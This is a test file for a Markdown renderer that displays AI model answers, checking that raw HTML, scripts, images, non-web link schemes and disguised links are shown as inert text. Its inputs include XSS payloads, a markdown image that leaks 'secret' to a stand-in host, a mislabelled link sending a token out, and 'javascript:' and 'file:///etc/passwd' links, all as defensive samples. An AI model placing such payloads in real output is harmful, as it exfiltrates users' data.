import { describe, it, expect, vi, beforeEach } from "vitest";
import { render, fireEvent } from "@testing-library/react";

const openURL = vi.hoisted(() => vi.fn());
vi.mock("@wailsio/runtime", () => ({ Browser: { OpenURL: openURL } }));

import { SafeMarkdown, safeLinkURL } from "./SafeMarkdown";

// The renderer is a trust boundary (spec 2026-10-14 §8): nothing in a model
// answer may load, navigate, execute or act.
describe("SafeMarkdown", () => {
  beforeEach(() => openURL.mockReset());

  it("shows raw HTML and SVG as literal text", () => {
    const { container } = render(<SafeMarkdown text={'<img src="https://x.test/p.png" onerror="alert(1)"> <svg onload="x()"></svg> <iframe src="https://x.test"></iframe> <script>alert(1)</script>'} />);
    expect(container.querySelector("img, svg, iframe, script")).toBeNull();
    expect(container.textContent).toContain("<script>alert(1)</script>");
  });

  it("never loads an image: alt text and URL as text", () => {
    const { container, getByTestId } = render(<SafeMarkdown text="see ![graph](https://evil.test/pixel.gif?leak=secret)" />);
    expect(container.querySelector("img")).toBeNull();
    expect(getByTestId("md-image").textContent).toBe("[image: graph] (https://evil.test/pixel.gif?leak=secret)");
  });

  it("makes only http and https clickable; other schemes are text", () => {
    for (const href of ["javascript:alert(1)", "data:text/html,<b>x</b>", "file:///etc/passwd", "klyx://delete-pod?name=web", "vbscript:x"]) {
      const { container, unmount } = render(<SafeMarkdown text={`[click](${href})`} />);
      expect(container.querySelector("a, [data-testid=md-link]")).toBeNull();
      expect(container.querySelector("[data-testid=md-unsafe-link]")?.textContent).toContain(href);
      unmount();
    }
    expect(safeLinkURL("https://ok.test/x")).not.toBeNull();
    expect(safeLinkURL("javascript:alert(1)")).toBeNull();
  });

  it("shows a link's real host beside a disguised label and opens only on click", () => {
    const { getByTestId, container } = render(<SafeMarkdown text="[https://grafana.example.com](https://evil.test/collect?d=token)" />);
    expect(container.textContent).toContain("(evil.test)");
    expect(container.querySelector("a[href]")).toBeNull(); // nothing the webview could follow
    expect(openURL).not.toHaveBeenCalled();
    fireEvent.click(getByTestId("md-link"));
    expect(openURL).toHaveBeenCalledWith("https://evil.test/collect?d=token");
  });

  it("renders the subset: headings, lists, code, emphasis, quotes", () => {
    const { container } = render(<SafeMarkdown text={"## Cause\n- the pod **crash-loops**\n- see `kubectl logs`\n\n```\nexit 137\n```\n> note"} />);
    expect(container.querySelector("[role=heading]")?.textContent).toBe("Cause");
    expect(container.querySelectorAll("li").length).toBe(2);
    expect(container.querySelector("strong")?.textContent).toBe("crash-loops");
    expect(container.querySelector("pre code")?.textContent).toBe("exit 137");
    expect(container.querySelector("blockquote")?.textContent).toBe("note");
  });
});
